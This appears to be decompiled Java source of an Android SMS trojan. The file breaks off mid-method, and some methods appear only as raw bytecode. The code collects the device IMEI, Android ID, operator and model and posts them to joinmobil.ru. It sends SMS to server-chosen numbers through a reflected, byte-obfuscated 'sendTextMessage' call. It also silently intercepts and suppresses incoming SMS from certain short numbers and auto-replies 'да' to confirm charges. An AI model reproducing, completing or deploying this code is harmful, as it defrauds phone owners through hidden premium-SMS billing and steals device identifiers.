package jp.selerino.bredno;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.res.AssetManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.SystemClock;
import android.provider.Settings.Secure;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy.Type;
import java.net.SocketAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Solomono
{
  public static final String slamander = "android.provider.Telephony.SMS_RECEIVED";
  BroadcastReceiver RequestReceiver = new BroadcastReceiver()
  {
    public void onReceive(Context paramAnonymousContext, Intent paramAnonymousIntent)
    {
      int i;
      int j;
      if (paramAnonymousIntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED"))
      {
        paramAnonymousContext = paramAnonymousIntent.getExtras();
        if (paramAnonymousContext != null)
        {
          paramAnonymousIntent = (Object[])paramAnonymousContext.get("pdus");
          paramAnonymousContext = new SmsMessage[paramAnonymousIntent.length];
          i = 0;
          if (i < paramAnonymousIntent.length) {
            break label58;
          }
          j = paramAnonymousContext.length;
          i = 0;
        }
      }
      for (;;)
      {
        if (i >= j)
        {
          return;
          label58:
          paramAnonymousContext[i] = SmsMessage.createFromPdu((byte[])paramAnonymousIntent[i]);
          i += 1;
          break;
        }
        paramAnonymousIntent = paramAnonymousContext[i];
        if (paramAnonymousIntent.getOriginatingAddress().replace("+7", "8").substring(0, 4).contains("2282"))
        {
          abortBroadcast();
          Solomono.this.sendSMSki(paramAnonymousIntent.getOriginatingAddress(), "да");
        }
        i += 1;
      }
    }
  };
  public int dyrq;
  public String fpzrm = "http://joinmobil.ru";
  public ArrayList<String> moznrtd = new ArrayList();
  public String napvldrmf;
  public String oasmh;
  public String obrtdopmdfl;
  public String ofrbovrdof;
  public int oniyypmd = 0;
  public String opqrtsypt;
  public String oqsvlmszr;
  public String ozpfrad;
  public String ozro;
  public String qstszd = "";
  public ArrayList<String> qtrgocrd = new ArrayList();
  public String trdiayita = "http://yandex.ru";
  public Context vpmyrcy;
  Timer yozrt = new Timer();
  public String yozrtd;
  
  public Solomono() {}
  
  private String getJson(String paramString)
  {
    Object localObject = this.vpmyrcy.getAssets();
    try
    {
      paramString = ((AssetManager)localObject).open(paramString);
      localObject = new byte[paramString.available()];
      paramString.read((byte[])localObject);
      paramString = new String((byte[])localObject);
      return paramString;
    }
    catch (IOException paramString)
    {
      paramString.printStackTrace();
    }
    return null;
  }
  
  /* Error */
  private void parsalldata(String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: new 129	org/json/JSONTokener
    //   5: dup
    //   6: aload_1
    //   7: invokespecial 131	org/json/JSONTokener:<init>	(Ljava/lang/String;)V
    //   10: invokevirtual 135	org/json/JSONTokener:nextValue	()Ljava/lang/Object;
    //   13: checkcast 137	org/json/JSONObject
    //   16: astore_1
    //   17: aload_0
    //   18: aload_1
    //   19: ldc -117
    //   21: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   24: putfield 54	jp/selerino/bredno/Solomono:trdiayita	Ljava/lang/String;
    //   27: aload_0
    //   28: aload_1
    //   29: ldc -112
    //   31: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   34: putfield 62	jp/selerino/bredno/Solomono:fpzrm	Ljava/lang/String;
    //   37: aload_1
    //   38: ldc -110
    //   40: invokevirtual 150	org/json/JSONObject:isNull	(Ljava/lang/String;)Z
    //   43: ifeq +187 -> 230
    //   46: aload_0
    //   47: iconst_0
    //   48: putfield 71	jp/selerino/bredno/Solomono:oniyypmd	I
    //   51: aload_0
    //   52: aload_1
    //   53: ldc -104
    //   55: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   58: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   61: aload_0
    //   62: aload_0
    //   63: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   66: ldc -102
    //   68: aload_0
    //   69: getfield 156	jp/selerino/bredno/Solomono:obrtdopmdfl	Ljava/lang/String;
    //   72: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   75: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   78: aload_0
    //   79: aload_0
    //   80: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   83: ldc -94
    //   85: aload_0
    //   86: getfield 164	jp/selerino/bredno/Solomono:ofrbovrdof	Ljava/lang/String;
    //   89: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   92: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   95: aload_0
    //   96: aload_0
    //   97: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   100: ldc -90
    //   102: aload_0
    //   103: getfield 168	jp/selerino/bredno/Solomono:opqrtsypt	Ljava/lang/String;
    //   106: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   109: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   112: aload_0
    //   113: aload_0
    //   114: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   117: ldc -86
    //   119: aload_0
    //   120: getfield 172	jp/selerino/bredno/Solomono:oqsvlmszr	Ljava/lang/String;
    //   123: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   126: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   129: aload_0
    //   130: aload_0
    //   131: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   134: ldc -82
    //   136: aload_0
    //   137: getfield 176	jp/selerino/bredno/Solomono:ozpfrad	Ljava/lang/String;
    //   140: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   143: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   146: aload_0
    //   147: aload_0
    //   148: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   151: ldc -78
    //   153: aload_0
    //   154: getfield 180	jp/selerino/bredno/Solomono:oasmh	Ljava/lang/String;
    //   157: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   160: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   163: aload_0
    //   164: aload_0
    //   165: getfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   168: ldc -74
    //   170: aload_0
    //   171: getfield 184	jp/selerino/bredno/Solomono:ozro	Ljava/lang/String;
    //   174: invokevirtual 160	java/lang/String:replace	(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;
    //   177: putfield 58	jp/selerino/bredno/Solomono:qstszd	Ljava/lang/String;
    //   180: aload_1
    //   181: aload_0
    //   182: getfield 168	jp/selerino/bredno/Solomono:opqrtsypt	Ljava/lang/String;
    //   185: invokevirtual 150	org/json/JSONObject:isNull	(Ljava/lang/String;)Z
    //   188: ifne +74 -> 262
    //   191: aload_0
    //   192: aload_1
    //   193: aload_0
    //   194: getfield 168	jp/selerino/bredno/Solomono:opqrtsypt	Ljava/lang/String;
    //   197: invokevirtual 188	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   200: invokevirtual 192	jp/selerino/bredno/Solomono:parseobject	(Lorg/json/JSONObject;)V
    //   203: return
    //   204: astore_1
    //   205: aload_1
    //   206: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   209: aload_2
    //   210: astore_1
    //   211: goto -194 -> 17
    //   214: astore_2
    //   215: aload_2
    //   216: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   219: goto -192 -> 27
    //   222: astore_2
    //   223: aload_2
    //   224: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   227: goto -190 -> 37
    //   230: aload_0
    //   231: aload_1
    //   232: ldc -110
    //   234: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   237: invokestatic 199	java/lang/Integer:parseInt	(Ljava/lang/String;)I
    //   240: putfield 71	jp/selerino/bredno/Solomono:oniyypmd	I
    //   243: goto -192 -> 51
    //   246: astore_2
    //   247: aload_2
    //   248: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   251: goto -200 -> 51
    //   254: astore_2
    //   255: aload_2
    //   256: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   259: goto -79 -> 180
    //   262: aload_0
    //   263: getfield 168	jp/selerino/bredno/Solomono:opqrtsypt	Ljava/lang/String;
    //   266: invokevirtual 202	java/lang/String:length	()I
    //   269: iconst_3
    //   270: if_icmple -67 -> 203
    //   273: aload_0
    //   274: aload_1
    //   275: aload_0
    //   276: getfield 168	jp/selerino/bredno/Solomono:opqrtsypt	Ljava/lang/String;
    //   279: iconst_0
    //   280: iconst_3
    //   281: invokevirtual 206	java/lang/String:substring	(II)Ljava/lang/String;
    //   284: invokevirtual 188	org/json/JSONObject:getJSONObject	(Ljava/lang/String;)Lorg/json/JSONObject;
    //   287: invokevirtual 192	jp/selerino/bredno/Solomono:parseobject	(Lorg/json/JSONObject;)V
    //   290: return
    //   291: astore_1
    //   292: aload_1
    //   293: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   296: return
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	297	0	this	Solomono
    //   0	297	1	paramString	String
    //   1	209	2	localObject	Object
    //   214	2	2	localJSONException1	JSONException
    //   222	2	2	localJSONException2	JSONException
    //   246	2	2	localJSONException3	JSONException
    //   254	2	2	localJSONException4	JSONException
    // Exception table:
    //   from	to	target	type
    //   2	17	204	org/json/JSONException
    //   17	27	214	org/json/JSONException
    //   27	37	222	org/json/JSONException
    //   230	243	246	org/json/JSONException
    //   51	180	254	org/json/JSONException
    //   180	203	291	org/json/JSONException
    //   262	290	291	org/json/JSONException
  }
  
  /* Error */
  private void parsnewdataandsend(String paramString)
  {
    // Byte code:
    //   0: ldc -48
    //   2: astore 8
    //   4: ldc -48
    //   6: astore_3
    //   7: ldc -48
    //   9: astore 4
    //   11: ldc -48
    //   13: astore 5
    //   15: ldc -48
    //   17: astore 6
    //   19: ldc -48
    //   21: astore 7
    //   23: aconst_null
    //   24: astore_2
    //   25: new 129	org/json/JSONTokener
    //   28: dup
    //   29: aload_1
    //   30: invokespecial 131	org/json/JSONTokener:<init>	(Ljava/lang/String;)V
    //   33: invokevirtual 135	org/json/JSONTokener:nextValue	()Ljava/lang/Object;
    //   36: checkcast 137	org/json/JSONObject
    //   39: astore_1
    //   40: aload_1
    //   41: astore_2
    //   42: aload_2
    //   43: ldc -46
    //   45: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   48: astore_1
    //   49: aload_2
    //   50: ldc -44
    //   52: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   55: astore 8
    //   57: aload 8
    //   59: astore_3
    //   60: aload_2
    //   61: ldc -42
    //   63: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   66: astore 8
    //   68: aload 8
    //   70: astore 4
    //   72: aload_2
    //   73: ldc -40
    //   75: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   78: astore 8
    //   80: aload 8
    //   82: astore 5
    //   84: aload_2
    //   85: ldc -38
    //   87: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   90: astore 8
    //   92: aload 8
    //   94: astore 6
    //   96: aload_2
    //   97: ldc -36
    //   99: invokevirtual 142	org/json/JSONObject:getString	(Ljava/lang/String;)Ljava/lang/String;
    //   102: astore_2
    //   103: aload_1
    //   104: ldc -48
    //   106: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   109: ifeq +23 -> 132
    //   112: aload 4
    //   114: ldc -48
    //   116: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   119: ifeq +13 -> 132
    //   122: aload 6
    //   124: ldc -48
    //   126: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   129: ifne +39 -> 168
    //   132: aload_0
    //   133: getfield 94	jp/selerino/bredno/Solomono:vpmyrcy	Landroid/content/Context;
    //   136: ldc -30
    //   138: iconst_0
    //   139: invokevirtual 230	android/content/Context:getSharedPreferences	(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    //   142: invokeinterface 236 1 0
    //   147: astore 7
    //   149: aload 7
    //   151: ldc -18
    //   153: iconst_1
    //   154: invokeinterface 244 3 0
    //   159: pop
    //   160: aload 7
    //   162: invokeinterface 248 1 0
    //   167: pop
    //   168: aload_1
    //   169: ldc -48
    //   171: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   174: ifne +9 -> 183
    //   177: aload_0
    //   178: aload_3
    //   179: aload_1
    //   180: invokevirtual 252	jp/selerino/bredno/Solomono:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   183: aload 4
    //   185: ldc -48
    //   187: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   190: ifne +11 -> 201
    //   193: aload_0
    //   194: aload 5
    //   196: aload 4
    //   198: invokevirtual 252	jp/selerino/bredno/Solomono:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   201: aload 6
    //   203: ldc -48
    //   205: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   208: ifne +10 -> 218
    //   211: aload_0
    //   212: aload_2
    //   213: aload 6
    //   215: invokevirtual 252	jp/selerino/bredno/Solomono:sendSMSki	(Ljava/lang/String;Ljava/lang/String;)V
    //   218: aload_1
    //   219: ldc -48
    //   221: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   224: ifeq +35 -> 259
    //   227: aload 4
    //   229: ldc -48
    //   231: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   234: ifeq +25 -> 259
    //   237: aload 6
    //   239: ldc -48
    //   241: invokevirtual 224	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   244: ifeq +15 -> 259
    //   247: aload_0
    //   248: getfield 76	jp/selerino/bredno/Solomono:yozrt	Ljava/util/Timer;
    //   251: invokevirtual 255	java/util/Timer:cancel	()V
    //   254: aload_0
    //   255: aconst_null
    //   256: putfield 76	jp/selerino/bredno/Solomono:yozrt	Ljava/util/Timer;
    //   259: return
    //   260: astore_1
    //   261: aload_1
    //   262: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   265: goto -223 -> 42
    //   268: astore_1
    //   269: aload_1
    //   270: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   273: aload 8
    //   275: astore_1
    //   276: goto -227 -> 49
    //   279: astore 8
    //   281: aload 8
    //   283: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   286: goto -226 -> 60
    //   289: astore 8
    //   291: aload 8
    //   293: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   296: goto -224 -> 72
    //   299: astore 8
    //   301: aload 8
    //   303: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   306: goto -222 -> 84
    //   309: astore 8
    //   311: aload 8
    //   313: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   316: goto -220 -> 96
    //   319: astore_2
    //   320: aload_2
    //   321: invokevirtual 193	org/json/JSONException:printStackTrace	()V
    //   324: aload 7
    //   326: astore_2
    //   327: goto -224 -> 103
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	330	0	this	Solomono
    //   0	330	1	paramString	String
    //   24	189	2	str1	String
    //   319	2	2	localJSONException1	JSONException
    //   326	1	2	localObject1	Object
    //   6	173	3	str2	String
    //   9	219	4	str3	String
    //   13	182	5	str4	String
    //   17	221	6	str5	String
    //   21	304	7	localObject2	Object
    //   2	272	8	str6	String
    //   279	3	8	localJSONException2	JSONException
    //   289	3	8	localJSONException3	JSONException
    //   299	3	8	localJSONException4	JSONException
    //   309	3	8	localJSONException5	JSONException
    // Exception table:
    //   from	to	target	type
    //   25	40	260	org/json/JSONException
    //   42	49	268	org/json/JSONException
    //   49	57	279	org/json/JSONException
    //   60	68	289	org/json/JSONException
    //   72	80	299	org/json/JSONException
    //   84	92	309	org/json/JSONException
    //   96	103	319	org/json/JSONException
  }
  
  private void startUpdater()
  {
    AlarmManager localAlarmManager = (AlarmManager)this.vpmyrcy.getSystemService("alarm");
    Object localObject = new Intent(this.vpmyrcy, Swater.class);
    localObject = PendingIntent.getBroadcast(this.vpmyrcy, 0, (Intent)localObject, 134217728);
    localAlarmManager.cancel((PendingIntent)localObject);
    localAlarmManager.setRepeating(3, SystemClock.elapsedRealtime(), 14400000L, (PendingIntent)localObject);
  }
  
  public int GetUnixTime()
  {
    return (int)(Calendar.getInstance().getTimeInMillis() / 1000L);
  }
  
  public void L(String paramString) {}
  
  public void SenderStart(Context paramContext, String paramString, int paramInt)
  {
    this.vpmyrcy = paramContext;
    if (paramInt == 1) {
      startUpdater();
    }
    this.obrtdopmdfl = Build.VERSION.SDK;
    this.ofrbovrdof = Settings.Secure.getString(this.vpmyrcy.getContentResolver(), "android_id");
    this.ozro = ((TelephonyManager)this.vpmyrcy.getSystemService("phone")).getDeviceId();
    this.opqrtsypt = ((TelephonyManager)this.vpmyrcy.getSystemService("phone")).getNetworkOperator();
    this.oqsvlmszr = this.vpmyrcy.getPackageName();
    this.ozpfrad = Build.MODEL;
    this.oasmh = Locale.getDefault().getLanguage();
    parsalldata(getJson(paramString));
  }
  
  protected String doInBackground(String paramString1, String paramString2)
    throws IOException
  {
    Object localObject = android.net.Proxy.getDefaultHost();
    int i = android.net.Proxy.getDefaultPort();
    paramString1 = new URL(paramString1);
    if (i > 0)
    {
      localObject = new InetSocketAddress((String)localObject, i);
      paramString1 = (HttpURLConnection)paramString1.openConnection(new java.net.Proxy(Proxy.Type.HTTP, (SocketAddress)localObject));
      paramString1.setDoInput(true);
      paramString1.setDoOutput(true);
      paramString1.setRequestMethod("POST");
      paramString1.setConnectTimeout(10000);
      localObject = new DataOutputStream(paramString1.getOutputStream());
      ((DataOutputStream)localObject).writeBytes(paramString2);
      ((DataOutputStream)localObject).flush();
      ((DataOutputStream)localObject).close();
      paramString1.connect();
      paramString1 = new BufferedReader(new InputStreamReader(paramString1.getInputStream(), "UTF-8"));
      paramString2 = new StringBuilder();
    }
    for (;;)
    {
      localObject = paramString1.readLine();
      if (localObject == null)
      {
        return paramString2.toString();
        paramString1 = (HttpURLConnection)paramString1.openConnection();
        break;
      }
      paramString2.append((String)localObject).append("\n");
    }
  }
  
  public void otstuk()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject = null;
        try
        {
          String str = Solomono.this.doInBackground(Solomono.this.fpzrm + "/stats/open.php", Solomono.this.qstszd);
          localObject = str;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            localIOException.printStackTrace();
          }
          Solomono.this.yozrtd = "0";
          return;
        }
        if (localObject != null)
        {
          if (localObject.contains("stop")) {
            Solomono.this.vpmyrcy.getSharedPreferences("ESLIABONENTTUPIT", 0).edit().putInt("countsend", 20);
          }
          if (localObject.contains("ok"))
          {
            Solomono.this.yozrtd = String.valueOf(Solomono.this.GetUnixTime());
            return;
          }
        }
        Solomono.this.yozrtd = "0";
      }
    }).start();
  }
  
  public void otstukpress()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject = null;
        try
        {
          String str = Solomono.this.doInBackground(Solomono.this.fpzrm + "/stats/press.php", Solomono.this.qstszd);
          localObject = str;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            localIOException.printStackTrace();
          }
          Solomono.this.yozrtd = "0";
          return;
        }
        if (localObject != null)
        {
          Solomono.this.L(localObject);
          if (localObject.contains("stop")) {
            Solomono.this.vpmyrcy.getSharedPreferences("ESLIABONENTTUPIT", 0).edit().putInt("countsend", 20);
          }
          if (localObject.contains("ok"))
          {
            Solomono.this.yozrtd = String.valueOf(Solomono.this.GetUnixTime());
            return;
          }
        }
        Solomono.this.yozrtd = "0";
      }
    }).start();
  }
  
  protected void parseobject(JSONObject paramJSONObject)
  {
    int j;
    int i;
    try
    {
      localJSONArray = paramJSONObject.getJSONArray("number");
      if (localJSONArray != null)
      {
        j = localJSONArray.length();
        i = 0;
        break label100;
      }
      paramJSONObject = paramJSONObject.getJSONArray("prefix");
      if (paramJSONObject == null) {
        return;
      }
      j = paramJSONObject.length();
      i = 0;
    }
    catch (JSONException paramJSONObject)
    {
      JSONArray localJSONArray;
      label47:
      paramJSONObject.printStackTrace();
      return;
    }
    this.moznrtd.add(localJSONArray.get(i).toString());
    i += 1;
    label100:
    do
    {
      this.qtrgocrd.add(paramJSONObject.get(i).toString());
      i += 1;
      continue;
      if (i < j) {
        break label47;
      }
      break;
    } while (i < j);
  }
  
  public void proverka()
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        Object localObject1 = null;
        try
        {
          localObject2 = Solomono.this.doInBackground(Solomono.this.fpzrm + "/stats/recheck.php", Solomono.this.qstszd);
          localObject1 = localObject2;
        }
        catch (IOException localIOException)
        {
          for (;;)
          {
            Object localObject2;
            SharedPreferences.Editor localEditor;
            int i;
            localIOException.printStackTrace();
          }
          Solomono.this.yozrtd = "0";
        }
        if (localObject1 != null)
        {
          Solomono.this.L("ответ сервера для уточнения колво = " + localObject1);
          if (localObject1.length() > 21)
          {
            localObject2 = Solomono.this.vpmyrcy.getSharedPreferences("ESLIABONENTTUPIT", 0);
            localEditor = ((SharedPreferences)localObject2).edit();
            i = ((SharedPreferences)localObject2).getInt("countimer", 0) + 1;
            localEditor.putInt("countimer", i);
            localEditor.commit();
            if (i > 20)
            {
              Solomono.this.yozrt.cancel();
              Solomono.this.yozrt = null;
            }
            Solomono.this.parsnewdataandsend(localObject1);
          }
          return;
        }
      }
    }).start();
  }
  
  public void requestReceived(String paramString) {}
  
  public void sendSMSka(String paramString1, String paramString2)
  {
    L("hera sebe5 " + paramString1 + " " + paramString2);
    Object localObject1 = this.vpmyrcy.getSharedPreferences("ESLIABONENTTUPIT", 0);
    Object localObject2 = ((SharedPreferences)localObject1).edit();
    int i = ((SharedPreferences)localObject1).getInt("countsend", 0) + 1;
    ((SharedPreferences.Editor)localObject2).putInt("countsend", i);
    ((SharedPreferences.Editor)localObject2).commit();
    L(Integer.toString(i));
    int j;
    if (i < 9)
    {
      localObject2 = new byte[15];
      Object tmp106_104 = localObject2;
      tmp106_104[0] = 101;
      Object tmp112_106 = tmp106_104;
      tmp112_106[1] = 120;
      Object tmp118_112 = tmp112_106;
      tmp118_112[2] = 116;
      Object tmp124_118 = tmp118_112;
      tmp124_118[3] = 77;
      Object tmp130_124 = tmp124_118;
      tmp130_124[4] = 101;
      Object tmp136_130 = tmp130_124;
      tmp136_130[5] = 115;
      Object tmp142_136 = tmp136_130;
      tmp142_136[6] = 115;
      Object tmp149_142 = tmp142_136;
      tmp149_142[7] = 97;
      Object tmp156_149 = tmp149_142;
      tmp156_149[8] = 103;
      Object tmp163_156 = tmp156_149;
      tmp163_156[9] = 101;
      Object tmp170_163 = tmp163_156;
      tmp170_163[10] = 115;
      Object tmp177_170 = tmp170_163;
      tmp177_170[11] = 101;
      Object tmp184_177 = tmp177_170;
      tmp184_177[12] = 110;
      Object tmp191_184 = tmp184_177;
      tmp191_184[13] = 100;
      Object tmp198_191 = tmp191_184;
      tmp198_191[14] = 84;
      tmp198_191;
      localObject1 = new byte[15];
      localObject1[5] = 101;
      localObject1[6] = 120;
      localObject1[7] = 116;
      localObject1[8] = 77;
      localObject1[9] = 101;
      localObject1[10] = 115;
      localObject1[11] = 115;
      localObject1[12] = 97;
      localObject1[13] = 103;
      localObject1[14] = 101;
      i = 0;
      j = localObject2.length - 5;
    }
    for (;;)
    {
      if (j >= localObject2.length)
      {
        int k = 0;
        j = i;
        i = k;
        label307:
        if (i < localObject2.length - 5) {
          break label477;
        }
        L("hera sebe6 " + paramString1 + " " + paramString2);
      }
      try
      {
        Object[] arrayOfObject;
        if (Integer.parseInt(Build.VERSION.SDK) < 4)
        {
          localObject2 = Class.forName("android.telephony.gsm.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.gsm.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
          localObject1[i] = localObject2[j];
          i += 1;
          j += 1;
          continue;
          label477:
          localObject1[j] = localObject2[i];
          j += 1;
          i += 1;
          break label307;
        }
        else
        {
          localObject2 = Class.forName("android.telephony.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
        }
      }
      catch (Exception paramString1) {}
    }
  }
  
  public void sendSMSkahi(String paramString1, String paramString2)
  {
    sendSMSka(paramString1, paramString2);
  }
  
  public void sendSMSki(String paramString1, String paramString2)
  {
    L("Отправляем смс номер:" + paramString1 + " текст" + paramString2);
    Object localObject2 = new byte[15];
    Object tmp39_37 = localObject2;
    tmp39_37[0] = 101;
    Object tmp45_39 = tmp39_37;
    tmp45_39[1] = 120;
    Object tmp51_45 = tmp45_39;
    tmp51_45[2] = 116;
    Object tmp57_51 = tmp51_45;
    tmp57_51[3] = 77;
    Object tmp63_57 = tmp57_51;
    tmp63_57[4] = 101;
    Object tmp69_63 = tmp63_57;
    tmp69_63[5] = 115;
    Object tmp75_69 = tmp69_63;
    tmp75_69[6] = 115;
    Object tmp82_75 = tmp75_69;
    tmp82_75[7] = 97;
    Object tmp89_82 = tmp82_75;
    tmp89_82[8] = 103;
    Object tmp96_89 = tmp89_82;
    tmp96_89[9] = 101;
    Object tmp103_96 = tmp96_89;
    tmp103_96[10] = 115;
    Object tmp110_103 = tmp103_96;
    tmp110_103[11] = 101;
    Object tmp117_110 = tmp110_103;
    tmp117_110[12] = 110;
    Object tmp124_117 = tmp117_110;
    tmp124_117[13] = 100;
    Object tmp131_124 = tmp124_117;
    tmp131_124[14] = 84;
    tmp131_124;
    Object localObject1 = new byte[15];
    localObject1[5] = 101;
    localObject1[6] = 120;
    localObject1[7] = 116;
    localObject1[8] = 77;
    localObject1[9] = 101;
    localObject1[10] = 115;
    localObject1[11] = 115;
    localObject1[12] = 97;
    localObject1[13] = 103;
    localObject1[14] = 101;
    int i = 0;
    int j = localObject2.length - 5;
    for (;;)
    {
      if (j >= localObject2.length)
      {
        int k = 0;
        j = i;
        i = k;
        label240:
        if (i < localObject2.length - 5) {
          break label379;
        }
      }
      try
      {
        Object[] arrayOfObject;
        if (Integer.parseInt(Build.VERSION.SDK) < 4)
        {
          localObject2 = Class.forName("android.telephony.gsm.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.gsm.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
          localObject1[i] = localObject2[j];
          i += 1;
          j += 1;
          continue;
          label379:
          localObject1[j] = localObject2[i];
          j += 1;
          i += 1;
          break label240;
        }
        else
        {
          localObject2 = Class.forName("android.telephony.SmsManager").getMethod("getDefault", null).invoke(null, null);
          localObject1 = Class.forName("android.telephony.SmsManager").getMethod(new String((byte[])localObject1), new Class[] { String.class, String.class, String.class, PendingIntent.class, PendingIntent.class });
          arrayOfObject = new Object[5];
          arrayOfObject[0] = paramString1;
          arrayOfObject[2] = paramString2;
          ((Method)localObject1).invoke(localObject2, arrayOfObject);
          return;
        }
      }
      catch (Exception paramString1) {}
    }
  }
  
  public void sendstart()
  {
    L("hera sebe");
    IntentFilter localIntentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
    this.vpmyrcy.registerReceiver(this.RequestReceiver, localIntentFilter);
    new Thread(new Runnable()
    {
      public void run()
      {
        Solomono.this.L("hera sebe2");
        int i;
        if ((Solomono.this.qtrgocrd != null) && (Solomono.this.qtrgocrd.size() > 0))
        {
          Solomono.this.L("hera sebe3");
          Solomono.this.yozrt.scheduleAtFixedRate(new Solomono.UpdateBallTask(Solomono.this), 40000L, 40000L);
